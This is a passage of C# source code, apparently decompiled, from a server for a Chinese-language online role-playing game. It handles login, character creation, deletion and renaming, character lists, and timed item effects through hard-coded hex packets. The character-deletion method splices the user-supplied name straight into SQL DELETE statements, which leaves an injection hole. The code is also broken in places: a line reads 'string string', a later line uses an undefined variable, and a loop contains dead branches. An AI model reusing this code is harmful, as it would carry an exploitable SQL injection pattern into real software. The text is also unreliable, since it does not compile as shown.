							Connect conn = World.conn;
							string string_ = "换线登陆|" + base.Userid + "|" + base.Client.ToString() + "|" + World.服务器ID + "|" + base.人物全服ID + "|" + base.Client.绑定帐号 + "|0|" + 客户端设置;
							conn.发送(string_);
							本人退出组队提示();
							Thread.Sleep(20);
							关闭交易窗口();
							上线 = true;
							判断是否用封包登陆 = 1;
							SerList.Clear();
							Connect conn2 = World.conn;
							string string_2 = "获取服务器列表|" + base.Userid + "|" + base.原服务器序号 + "|" + base.原服务器IP + "|" + base.原服务器端口 + "|" + base.原服务器ID;
							conn2.发送(string_2);
						}
						else if (base.Client != null)
						{
							base.Client.Dispose();
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(100, "人物登陆出错[" + base.Userid + "]-[" + base.UserName + "]      " + num + "      " + ex.Message);
				if (base.Client != null)
				{
					kickidlog("换线人物登陆出错      " + num);
					OpClient(1);
					base.Client.Dispose();
				}
			}
		}

		public void 关闭交易窗口()
		{
			byte[] array = Converter.hexStringToByte("AA55420000009800340006000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 版本验证(byte[] data, int length)
		{
			连接成功 = true;
			try
			{
				base.Client.g_cur_key = World.g_cur_key;
				byte[] array = Converter.hexStringToByte("AA551A00100515200400700700000000000000000000000000000000000055AA");
				System.Buffer.BlockCopy(World.g_cur_key, 0, array, 14, 8);
				System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				base.Client.版本验证 = true;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "连接登陆版本验证出错[" + base.人物全服ID + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 换线验证(byte[] data, int length)
		{
			int num = 0;
			连接成功 = true;
			try
			{
				num = 1;
				byte[] array = Converter.hexStringToByte("AA559200100515208400700700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
				num = 2;
				Random random = new Random();
				num = 3;
				byte[] array2 = new byte[32];
				num = 4;
				for (int i = 0; i < array2.Length; i++)
				{
					array2[i] = (byte)random.Next(1, 255);
				}
				num = 5;
				base.Client.g_cur_key = array2;
				num = 6;
				System.Buffer.BlockCopy(base.Client.g_cur_key, 0, array, 14, 32);
				num = 7;
				base.人物封包ID = BitConverter.ToUInt16(data, 4);
				num = 8;
				System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
				num = 9;
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				num = 10;
				byte[] array3 = new byte[20];
				num = 11;
				for (int j = 0; j < 20 && data[10 + j] != 0; j++)
				{
					array3[j] = data[10 + j];
				}
				num = 12;
				string text = Encoding.Default.GetString(array3).Trim();
				num = 13;
				string empty = string.Empty;
				string text2 = text.Replace("\0", empty).Trim();
				num = 14;
				int num2 = data[30];
				int num3 = data[34];
				num = 15;
				World.conn.发送("用户换线登陆|" + text2 + "|" + num2 + "|" + num3 + "|" + base.Client.WorldId + "|" + base.Client.ToString() + "|" + World.服务器ID + "|" + 判断是否用封包登陆);
				byte[] array4 = Converter.hexStringToByte("AA550700AE04DB0001000155AA");
				System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array4, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array4, array4.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, num + "      换线验证[" + base.人物全服ID + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 删除人物(byte[] 封包数据, int 封包大小)
		{
		}

		public bool 删除人物(string UserName)
		{
			try
			{
				if (DBA.ExeSqlCommand(string.Format("DELETE      TBL_XWWL_Char            WHERE      FLD_NAME='{0}'", UserName)) == -1 || DBA.ExeSqlCommand(string.Format("DELETE      TBL_XWWL_Cw            WHERE      ZrName='{0}'", UserName)) == -1 || DBA.ExeSqlCommand(string.Format("DELETE      TBL_XWWL_GuildMember            WHERE      FLD_NAME='{0}'", UserName)) == -1 || DBA.ExeSqlCommand(string.Format("DELETE      TBL_XWWL_Warehouse            WHERE      FLD_NAME='{0}'", UserName)) == -1)
				{
					return false;
				}
				if (DBA.ExeSqlCommand(string.Format("DELETE      TBL_荣誉系统            WHERE      FLD_人物名='{0}'", UserName)) == -1)
				{
					return false;
				}
			}
			catch
			{
				return false;
			}
			return true;
		}

		public void 创建人物(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				string string_ = "AA55120000001500040001000000000000000000000055AA";
				byte[] array = Converter.hexStringToByte("AA55120000001500040000000000000000000000000055AA");
				byte[] array2 = Converter.hexStringToByte(string_);
				byte[] array3 = new byte[14];
				System.Buffer.BlockCopy(封包数据, 10, array3, 0, 14);
				byte[] array4 = new byte[10];
				System.Buffer.BlockCopy(封包数据, 27, array4, 0, 10);
				string text2 = "0x" + Converter.ToString(array4);
				string text = Encoding.Default.GetString(array3).Replace("\0", string.Empty).Trim();
				int num = 封包数据[26];
				byte b = 封包数据[32];
				if ((uint)(b - 1) <= 1u)
				{
					if (num >= 1 && num <= 13)
					{
						if (text.Length == 0)
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
							if (base.Client != null)
							{
								base.Client.Send(array, array.Length);
							}
						}
						if (RxjhClass.SetUserName(base.Userid, text, num, array4) != 1)
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
							if (base.Client != null)
							{
								base.Client.Send(array, array.Length);
							}
						}
						else
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
							if (base.Client != null)
							{
								base.Client.Send(array2, array2.Length);
							}
						}
					}
					else
					{
						封号(72, base.Userid, "非法人物职业");
					}
				}
				else
				{
					封号(72, base.Userid, "非法人物性别");
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "连创建人物出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 打开换名符(byte[] data, int length)
		{
			int num = Buffer.ToInt32(data, 15);
			if (num == 1008000126)
			{
				发包类 发包类 = new 发包类();
				发包类.Write4(0);
				发包类.Write8(num);
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(1);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 29744, base.人物全服ID);
				}
			}
		}

		public void 换人物名(byte[] data, int length)
		{
			封包修改(data, length);
			byte[] array = Converter.hexStringToByte("AA551E002C01910010002F000000000000000000000000000000000000000000000055AA");
			try
			{
				byte[] array2 = new byte[4];
				System.Buffer.BlockCopy(data, 24, array2, 0, 1);
				if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array2, 0)].物品ID, 0) == 1008000126)
				{
					byte[] array3 = new byte[14];
					System.Buffer.BlockCopy(data, 10, array3, 0, 14);
					string text = Encoding.Default.GetString(array3).Replace("\0", string.Empty).Trim();
					foreach (KillClass item in World.Kill)
					{
						if (item.Sffh == 4 && text.IndexOf(item.Txt) != -1)
						{
							Form1.WriteLine(100, "非法创建名字：" + text + "  帐号" + base.Userid);
							系统提示("非法人物名,请重新输入", 9, "系统提示");
							return;
						}
					}
					if (base.帮派Id != 0)
					{
						系统提示("请先退出门派再换名。");
					}
					else if (组队id != 0)
					{
						系统提示("请先退出组队再换名。");
					}
					else if (base.FLD_情侣.Length != 0)
					{
						系统提示("请先解除情侣再换名。");
					}
					else if (师傅数据.TID != -1)
					{
						系统提示("请先解除师徒再换名。");
					}
					else if (徒弟数据[0].TID == -1 && 徒弟数据[1].TID == -1 && 徒弟数据[2].TID == -1)
					{
						DBA.ExeSqlCommand(string.Format("UPDATE  TBL_XWWL_Char  SET  FLD_NAME  =  @sTemp  WHERE  FLD_ID  =  @Userid  AND  FLD_NAME  =  @Username"), new SqlParameter[3]
						{
							SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid),
							SqlDBA.MakeInParam("@Username", SqlDbType.VarChar, 30, base.UserName),
							SqlDBA.MakeInParam("@sTemp", SqlDbType.VarChar, 30, text)
						});
						DBA.ExeSqlCommand(string.Format("UPDATE  TBL_XWWL_Warehouse  SET  FLD_NAME  =  @sTemp  WHERE  FLD_ID  =  @Userid  AND  FLD_NAME  =  @Username"), new SqlParameter[3]
						{
							SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid),
							SqlDBA.MakeInParam("@Username", SqlDbType.VarChar, 30, base.UserName),
							SqlDBA.MakeInParam("@sTemp", SqlDbType.VarChar, 30, text)
						});
						base.UserName = text;
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						初始化已装备物品();
						移动离开当前地图(base.人物坐标_地图);
						获取复查范围玩家();
						系统提示("换名成功,请重新上线。");
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
					}
					else
					{
						系统提示("请先解除师徒再换名。");
					}
				}
			}
			catch (Exception)
			{
				系统提示("系统出错请联系客服人员。");
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
		}

		public void 检查人物是否存在(byte[] 封包数据, int 封包大小)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA5522000000390014000000000000000000000000000000000000000000000000000000000055AA");
				byte[] array2 = Converter.hexStringToByte("AA5522000000390014000100000000000000000000000000000000000000000000000000000055AA");
				byte[] array3 = new byte[14];
				System.Buffer.BlockCopy(封包数据, 10, array3, 0, 14);
				string text = Encoding.Default.GetString(array3).Replace("\0", string.Empty).Trim();
				byte[] bytes = Encoding.Default.GetBytes(text);
				System.Buffer.BlockCopy(bytes, 0, array, 14, bytes.Length);
				System.Buffer.BlockCopy(bytes, 0, array2, 14, bytes.Length);
				if (text.Length <= 2)
				{
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
				else if (RxjhClass.GetUserName(text) != 1)
				{
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
				else
				{
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array2, array2.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "创建人物检查人物是否存在出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 获取人物列表(byte[] data, int length)
		{
			try
			{
				封包修改(data, length);
				base.UserName = string.Empty;
				allChars = new Dictionary<int, string>();
				byte[] src = new byte[World.数据库单个物品大小];
				byte[] array = Converter.hexStringToByte("AA550B00D80311000500FF45859A0455AA");
				string string
				DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [TBL_XWWL_Char]  where  FLD_ID=@Userid"), new SqlParameter[1]
				{
					SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid)
				});
				if (dBToDataTable != null)
				{
					if (dBToDataTable.Rows.Count == 0)
					{
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
						goto IL_0745;
					}
					if (dBToDataTable.Rows.Count <= 4)
					{
						for (int i = 0; i < dBToDataTable.Rows.Count; i++)
						{
							int key = (int)dBToDataTable.Rows[i]["FLD_INDEX"];
							string text = dBToDataTable.Rows[i]["FLD_NAME"].ToString();
							if (allChars.ContainsKey(key))
							{
								allChars.Remove(key);
							}
							allChars.Add(key, text);
							byte[] array2 = Converter.hexStringToByte(string_);
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
							byte[] bytes = Encoding.Default.GetBytes(text);
							byte[] bytes2 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_ZX"]);
							byte[] bytes3 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_LEVEL"]);
							byte[] bytes4 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_JOB_LEVEL"]);
							byte[] bytes5 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_JOB"]);
							byte[] bytes6 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_HP"]);
							byte[] bytes7 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_MP"]);
							BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_SP"]);
							byte[] src2 = (byte[])dBToDataTable.Rows[i]["FLD_WEARITEM"];
							人物模板类 人物模板类 = new 人物模板类((byte[])dBToDataTable.Rows[i]["FLD_FACE"]);
							byte[] bytes8 = BitConverter.GetBytes(float.Parse(dBToDataTable.Rows[i]["FLD_X"].ToString()));
							byte[] bytes9 = BitConverter.GetBytes(float.Parse(dBToDataTable.Rows[i]["FLD_Y"].ToString()));
							byte[] bytes10 = BitConverter.GetBytes(float.Parse(dBToDataTable.Rows[i]["FLD_Z"].ToString()));
							byte[] bytes11 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_MENOW"]);
							System.Buffer.BlockCopy(bytes8, 0, array2, 67, 4);
							byte[] dst = array2;
							System.Buffer.BlockCopy(bytes10, 0, dst, 71, 4);
							byte[] dst2 = array2;
							System.Buffer.BlockCopy(bytes9, 0, dst2, 75, 4);
							System.Buffer.BlockCopy(bytes11, 0, array2, 79, 2);
							DataTable userNameBp = RxjhClass.GetUserNameBp(text);
							if (userNameBp != null)
							{
								System.Buffer.BlockCopy(BitConverter.GetBytes((int)userNameBp.Rows[0]["门服字"]), 0, array2, 83, 1);
								System.Buffer.BlockCopy(BitConverter.GetBytes((int)userNameBp.Rows[0]["门服颜色"]), 0, array2, 85, 2);
								userNameBp.Dispose();
							}
							byte[] bytes12 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_JQ"]);
							System.Buffer.BlockCopy(bytes12, 0, array2, 2839, bytes12.Length);
							array2[10] = byte.Parse(key.ToString());
							System.Buffer.BlockCopy(bytes, 0, array2, 11, bytes.Length);
							System.Buffer.BlockCopy(bytes2, 0, array2, 49, 2);
							System.Buffer.BlockCopy(bytes3, 0, array2, 51, 2);
							System.Buffer.BlockCopy(bytes4, 0, array2, 53, 2);
							System.Buffer.BlockCopy(bytes5, 0, array2, 55, 1);
							System.Buffer.BlockCopy(BitConverter.GetBytes((int)人物模板类.发色), 0, array2, 57, 2);
							System.Buffer.BlockCopy(BitConverter.GetBytes((int)人物模板类.发型), 0, array2, 59, 2);
							System.Buffer.BlockCopy(BitConverter.GetBytes((int)人物模板类.脸型), 0, array2, 61, 2);
							System.Buffer.BlockCopy(BitConverter.GetBytes((int)人物模板类.声音), 0, array2, 63, 1);
							System.Buffer.BlockCopy(BitConverter.GetBytes((int)人物模板类.性别), 0, array2, 64, 1);
							System.Buffer.BlockCopy(bytes6, 0, array2, 163, 2);
							byte[] dst3 = array2;
							System.Buffer.BlockCopy(bytes7, 0, dst3, 165, 2);
							int num3 = (int)dBToDataTable.Rows[i]["FLD_ZBVER"];
							int num = 199;
							for (int j = 0; j < 15; j++)
							{
								if (j >= 15)
								{
									System.Buffer.BlockCopy(src, 0, array2, num + j * World.发包单个物品大小, 72);
								}
								else
								{
									try
									{
										byte[] array3 = new byte[12];
										System.Buffer.BlockCopy(src2, j * 73, array3, 0, 12);
										int num2 = BitConverter.ToInt32(array3, 8);
										if (num2 != 0)
										{
											if (j == 11)
											{
												if (World.Itme[num2].FLD_SERIES == 1)
												{
													num2 = int.Parse(num2.ToString().Remove(7) + "0");
													for (int k = 0; k < 7; k++)
													{
														ItmeClass value;
														if (World.Itme.TryGetValue(num2, out value) && value.FLD_SERIES == 2)
														{
															num2 = value.FLD_PID;
															break;
														}
														num2++;
													}
													if (num2 >= 16900830 && num2 <= 16900836)
													{
														num2 = 16900832;
													}
												}
											}
											else if (World.Itme[num2].FLD_INTEGRATION == 1)
											{
												num2 -= 5000;
											}
											System.Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array3, 8, 4);
										}
										System.Buffer.BlockCopy(array3, 0, array2, num + j * World.发包单个物品大小, 12);
										System.Buffer.BlockCopy(src2, j * 73 + 12, array2, num + j * World.发包单个物品大小 + 16, 60);
									}
									catch
									{
										System.Buffer.BlockCopy(src, 0, array2, num + j * World.发包单个物品大小, 72);
									}
								}
							}
							if (base.Client != null)
							{
								base.Client.Send(array2, array2.Length);
							}
						}
						goto IL_0745;
					}
					Form1.WriteLine(1, "人物列表出错，人物数量太多[" + base.Userid + "][" + base.UserName + "]  人物全服ID=[" + base.人物全服ID + "]  [" + base.Client.ToString() + "]  数[" + dBToDataTable.Rows.Count + "]");
					dBToDataTable.Dispose();
					base.Client.Dispose();
				}
				else
				{
					base.Client.Send(array, array.Length);
				}
				goto end_IL_0000;
				IL_0745:
				dBToDataTable.Dispose();
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "获取人物列表出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 退回到人物列表(byte[] 封包数据, int 封包大小)
		{
			人物是否登陆 = false;
			退出中 = true;
			Logout();
			byte[] array = Converter.hexStringToByte("AA5512000C035700040004000000000000000000000055AA");
			byte[] array2 = Converter.hexStringToByte("AA5516000C03630008000100000000000001000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 退出(byte[] data, int length)
		{
			封包修改(data, length);
			人物是否登陆 = false;
			退出中 = true;
			Logout();
			byte[] array = Converter.hexStringToByte("AA553800000004002A00010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			byte[] array2 = new byte[base.Userid.Length];
			byte[] bytes = Encoding.Default.GetBytes(base.Userid);
			if (base.UserName.Length > 0)
			{
				byte[] array3 = new byte[base.UserName.Length];
				byte[] bytes2 = Encoding.Default.GetBytes(base.UserName);
				System.Buffer.BlockCopy(bytes2, 0, array, 18, bytes2.Length);
			}
			System.Buffer.BlockCopy(bytes, 0, array, 31, bytes.Length);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Dispose();
			}
		}

		public void 显示()
		{
			byte[] array = Converter.hexStringToByte("AA550600B2012000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 服务器时间()
		{
			int 世界时间 = World.世界时间;
			byte[] array = Converter.hexStringToByte("AA551200000080000400D0070000000000000000000055AA");
			byte[] array2 = Converter.hexStringToByte("AA551200000080000400D1070000000000000000000055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(世界时间), 0, array, 10, 4);
			System.Buffer.BlockCopy(Buffer.GetBytes(世界时间), 0, array2, 10, 4);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 检测走跑()
		{
			using (发包类 发包类 = new 发包类())
			{
				发包类.Write4(1);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 1536, base.人物全服ID);
				}
			}
		}

		public void 灵兽数()
		{
			try
			{
				if (Buffer.ToInt32(装备栏已穿装备[14].物品ID, 0) == 0)
				{
					byte[] array = Converter.hexStringToByte("AA5516000100591008000B00000000000000000000000000000055AA");
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
				else
				{
					发送灵兽数据(BitConverter.ToInt64(装备栏已穿装备[14].物品全局ID, 0));
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "灵兽数()出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 未知功能1()
		{
			byte[] array = Converter.hexStringToByte("AA55BE000F276600B800180100000000000000000000000000000000000000000000533120536574546972626542794D617020204465627567506F735B335D204D61705B313230315D20205472696265547970655B305D2054726962655B315D20205472696265556E6368616E67654D61705B2D315D0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 未知功能3()
		{
			byte[] array = Converter.hexStringToByte("AA550600B6057801000055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 未知功能4()
		{
			byte[] array = Converter.hexStringToByte("AA554E00B6054B104800000F0000000000000000000000000000000200031C980A00A0BB0D00000000000000000000000000323031393131323431360020202020203230313931313235313000202020202055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 未知功能5()
		{
			byte[] array = Converter.hexStringToByte("AA55BE000F276600B8000800300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006900008914000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 未知功能6()
		{
			byte[] array = Converter.hexStringToByte("AA550800B60515020200010055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 未知功能2()
		{
			byte[] array = Converter.hexStringToByte("AA55BE000F276600B8001801000000000000000000000000000000000000000000001C53657444656661756C745472696265556E6368616E67654D61702829000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 发送在线时长消息(int num)
		{
			byte[] array = Converter.hexStringToByte("AA5516004305002108000000000000000100000000000000C49655AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 药品新效果(int 物品id, int 开关, int 开始时间, int 结束时间)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(0);
			发包类.Write4(0);
			发包类.Write4(物品id);
			发包类.Write4(0);
			发包类.Write2(0);
			发包类.Write2(1);
			double num = Convert.ToDouble(DateTime.ParseExact(开始时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture).AddMinutes(-结束时间).ToString("yyMMddHHmm"));
			if (开关 != 0)
			{
				发包类.Write4(开始时间);
			}
			else
			{
				发包类.Write4(0);
			}
			发包类.Write2(开关);
			发包类.Write2(0);
			if (开关 != 0)
			{
				发包类.Write4((int)num);
			}
			else
			{
				发包类.Write4(0);
			}
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 17153, base.人物全服ID);
			}
		}

		public void 称号物品结束()
		{
			try
			{
				bool flag = false;
				bool flag2 = false;
				bool flag3 = false;
				bool flag4 = false;
				bool flag5 = false;
				foreach (称号药品类 value in 称号药品.Values)
				{
					if (!称号药品.ContainsKey(value.药品ID))
					{
						return;
					}
					switch (value.药品ID)
					{
					case 1008001042:
						if ((DateTime.ParseExact(value.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now).TotalMinutes <= 0.0 && 时间药品.ContainsKey(value.药品ID))
						{
							flag = true;
						}
						break;
					case 1000001150:
						if ((DateTime.ParseExact(value.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now).TotalMinutes <= 0.0 && 时间药品.ContainsKey(value.药品ID))
						{
							flag4 = true;
						}
						break;
					case 1008001479:
						if ((DateTime.ParseExact(value.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now).TotalMinutes <= 0.0 && 时间药品.ContainsKey(value.药品ID))
						{
							flag3 = true;
						}
						break;
					case 1008001478:
						if ((DateTime.ParseExact(value.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now).TotalMinutes <= 0.0 && 时间药品.ContainsKey(value.药品ID))
						{
							flag5 = true;
						}
						break;
					case 1008001043:
						if ((DateTime.ParseExact(value.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now).TotalMinutes <= 0.0 && 时间药品.ContainsKey(value.药品ID))
						{
							flag2 = true;
						}
						break;
					}
				}
				if (flag4 && 称号药品.ContainsKey(1000001150))
				{
					称号药品.Remove(1000001150);
					药品新效果(1000001150, 0, 0, 0);
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
				}
				if (flag && 称号药品.ContainsKey(1008001042))
				{
					称号药品.Remove(1008001042);
					药品新效果(1008001042, 0, 0, 0);
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
				}
				if (flag2 && 称号药品.ContainsKey(1008001043))
				{
					称号药品.Remove(1008001043);
					药品新效果(1008001043, 0, 0, 0);
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
				}
				if (flag5)
				{
					药品追加对怪攻击 = 0;
					药品追加对怪防御 = 0;
					FLD_药品_追加_气功 = 0;
					if (时间药品.ContainsKey(1008001478))
					{
						时间药品.Remove(1008001478);
						药品新效果(1008001478, 0, 0, 0);
						更新武功和状态();
						更新人物数据(this);
						更新广播人物数据();
					}
				}
				if (flag3)
				{
					药品追加对怪攻击 = 0;
					药品追加对怪防御 = 0;
					FLD_药品_追加_气功 = 0;
					if (时间药品.ContainsKey(1008001479))
					{
						时间药品.Remove(1008001479);
						药品新效果(1008001479, 0, 0, 0);
						更新武功和状态();
						更新人物数据(this);
						更新广播人物数据();
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "set称号物品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void set称号物品()
		{
			foreach (称号药品类 value in 称号药品.Values)
			{
				Set武勋物品(value);
			}
		}

		public void Set武勋物品(称号药品类 药品)
		{
			try
			{
				switch (药品.药品ID)
				{
				case 1008001043:
				{
					DateTime d7 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now7 = DateTime.Now;
					TimeSpan timeSpan7 = d7 - now7;
					药品新效果(1008001043, 1, 药品.时间, (int)timeSpan7.TotalMinutes);
					break;
				}
				case 1008001042:
				{
					DateTime d6 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now6 = DateTime.Now;
					TimeSpan timeSpan6 = d6 - now6;
					药品新效果(1008001042, 1, 药品.时间, (int)timeSpan6.TotalMinutes);
					break;
				}
				case 1000001150:
				{
					DateTime d5 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now5 = DateTime.Now;
					TimeSpan timeSpan5 = d5 - now5;
					药品新效果(1000001150, 1, 药品.时间, (int)timeSpan5.TotalMinutes);
					break;
				}
				case 1008001479:
				{
					DateTime d4 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now4 = DateTime.Now;
					TimeSpan timeSpan4 = d4 - now4;
					药品追加对怪攻击 = 150;
					药品追加对怪防御 = 200;
					FLD_药品_追加_气功 = 2;
					药品新效果(1008001479, 1, 药品.时间, (int)timeSpan4.TotalMinutes);
					break;
				}
				case 1008001478:
				{
					DateTime d3 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now3 = DateTime.Now;
					TimeSpan timeSpan3 = d3 - now3;
					药品追加对怪攻击 = 150;
					药品追加对怪防御 = 200;
					FLD_药品_追加_气功 = 2;
					药品新效果(1008001478, 1, 药品.时间, (int)timeSpan3.TotalMinutes);
					break;
				}
				case 1008002377:
				{
					DateTime d2 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now2 = DateTime.Now;
					TimeSpan timeSpan2 = d2 - now2;
					药品新效果(1008002377, 1, 药品.时间, (int)timeSpan2.TotalMinutes);
					break;
				}
				case 1008002376:
				{
					DateTime d = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now = DateTime.Now;
